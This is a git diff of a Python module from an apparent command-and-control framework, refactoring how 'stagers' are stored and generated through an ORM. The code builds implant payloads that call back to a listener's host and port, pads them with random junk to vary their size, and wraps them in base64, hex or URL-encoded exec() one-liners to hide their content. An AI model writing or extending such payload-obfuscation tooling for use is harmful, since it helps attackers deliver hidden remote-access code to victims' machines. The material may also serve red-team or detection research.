@@ -1,35 +1,48 @@
 """Create Stagers to download or copy"""
+import random
+import base64
+import string
+import json
 from binascii import hexlify
 import urllib.parse
-from Utils import curr, conn, json, string, random, base64
+from Database import db_session, StagerModel, ListenerModel
 
 
-def create_stager(name: str, listener_id: int,
-                  encoder: str = "base64",
-                  random_size: bool = False,
-                  timeout: int = 5000,
-                  stager_format: str = "py",
-                  delay: int = 1,
-                  finished: bool = True) -> any:
+def add_stager(name: str, listener_id: int,
+               encoding: str = "base64",
+               random_size: bool = False,
+               timeout: int = 5000,
+               stager_format: str = "py",
+               delay: int = 1) -> any:
     """
-    Create a Stager
-    :name: The Name of the Stager
+    Add a stager to the database
+    :name: The Name of the stager
     :listener_id: The Listener to use
+    :encoding: The encoding to use
     :random_size: Randomize the size of the payload
-    :delay: How long to wait before starting the Stager
-    :timeout: How often the Stager should try to connect before exiting
+    :timeout: How often the stager should try to connect before exiting
+    :stager_format: The format of the payload
+    :delay: How long to wait before starting the stager
     """
 
     # Check if name is already in use
-    curr.execute("SELECT * FROM Stagers WHERE Name = ?", (name,))
-    stager = curr.fetchone()
-    if stager:
+    stager: StagerModel = db_session.query(
+        StagerModel).filter_by(name=name).first()
+    if stager is not None:
         raise Exception(f"Stager {name} already exists")
 
     # Save the Stager to the Database
-    curr.execute(
-        "INSERT INTO Stagers (Name, ListenerId) VALUES (?, ?)", (name, listener_id))
-    conn.commit()
+    stager = StagerModel(
+        name=name,
+        listener_id=listener_id,
+        encoding=encoding,
+        random_size=random_size,
+        timeout=timeout,
+        stager_format=stager_format,
+        delay=delay
+    )
+    db_session.add(stager)
+    db_session.commit()
     return "Created Stager successfully!"
 
 
@@ -44,36 +57,25 @@ def get_stager(stager_id: str, one_liner: bool = True) -> any:
     """
 
     # Get required Data
-    curr.execute("SELECT ListenerId FROM Stagers WHERE ID = ?", (stager_id,))
-    stager = curr.fetchone()
+    stager: StagerModel = db_session.query(
+        StagerModel).filter_by(stager_id=stager_id).first()
     if not stager:
         raise Exception(f"Stager with ID {stager_id} does not exist")
 
-    listener_id = stager[0]
-
-    curr.execute("SELECT * FROM Listeners WHERE id = ?", (listener_id,))
-    listener = curr.fetchone()
-    if not listener:
+    listener: ListenerModel = db_session.query(
+        ListenerModel).filter_by(listener_id=stager.listener_id).first()
+    if listener is None:
         raise Exception("Could not find the listener")
-
-    # Get Data from the Listener
-    listener_type = listener[2]
-    config = json.loads(listener[3])
-
-    # Get Config Data
-    address = config["address"]
-    port = config["port"]
-    ssl = True if str(config["ssl"]).lower() == "true" else False
 
     # Get the Payload from the File
     try:
-        with open("Payloads/" + listener_type + ".py", "r") as f:
+        with open("Payloads/" + stager.stager_format + ".py", "r") as f:
             payload = f.read()
     except:
         raise Exception("Could not find the payload")
 
     # Randomize the Payload
-    if random_size:
+    if stager.random_size:
         start = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
             "'" + "".join(random.choices(string.ascii_letters +
                           string.digits, k=random.randint(100, 500))) + "'"
@@ -86,48 +88,46 @@ def get_stager(stager_id: str, one_liner: bool = True) -> any:
 
     # Replace the Payload
     finished_payload = start + "\n"
-    finished_payload += f"import time\ntime.sleep({delay})\n"
-    finished_payload += f"HOST = '{address}'\n \
-        PORT = {port}\n \
-        TIMEOUT = {timeout}\n \
-        SSL={ssl}\n"
+    finished_payload += f"import time\ntime.sleep({stager.delay})\n"
+    finished_payload += f"HOST = '{listener.address}'\n \
+        PORT = {listener.port}\n \
+        TIMEOUT = {stager.timeout}\n \
+        SSL={listener.ssl}\n"
     finished_payload += payload + "\n" + end
 
     # Encode the Payload
-    if not one_liner:
-        if encoder == "base64":
+    if not one_liner and not stager.stager_format == "exe":
+        if stager.encoding == "base64":
             finished_payload = base64.b64encode(
                 finished_payload.encode()).decode()
-        elif encoder == "hex":
+        elif stager.encoding == "hex":
             finished_payload = hexlify(finished_payload.encode()).decode()
-        elif encoder == "url":
+        elif stager.encoding == "url":
             finished_payload = urllib.parse.quote(finished_payload)
-        elif encoder == "raw":
+        elif stager.encoding == "raw":
             pass
         else:
-            raise Exception("Encoder not supported")
+            raise Exception("Encoding not supported")
     else:
-        if encoder == "base64":
+        if stager.encoding == "base64":
             finished_payload = """"import base64; \
                 exec(base64.b64decode(b'%s'))""" % base64.b64encode(
                 finished_payload.encode()).decode()
-        elif encoder == "hex":
+        elif stager.encoding == "hex":
             finished_payload = """from binascii import unhexlify;exec(unhexlify('%s'))""" % hexlify(
                 finished_payload.encode()).decode()
-        elif encoder == "url":
+        elif stager.encoding == "url":
             finished_payload = """import urllib.parse; \
             exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
                 finished_payload)
-        elif encoder == "raw":
+        elif stager.encoding == "raw":
             pass
         else:
-            raise Exception("Encoder not supported")
+            raise Exception("encoding not supported")
 
-    if stager_format == "py":
+    if stager.stager_format == "py":
         return finished_payload
-    elif stager_format == "exe":
-        if not one_liner:
-            raise Exception("Cannot create an exe from a non finished payload")
+    elif stager.stager_format == "exe":
         # Create the EXE
         pass
     else:
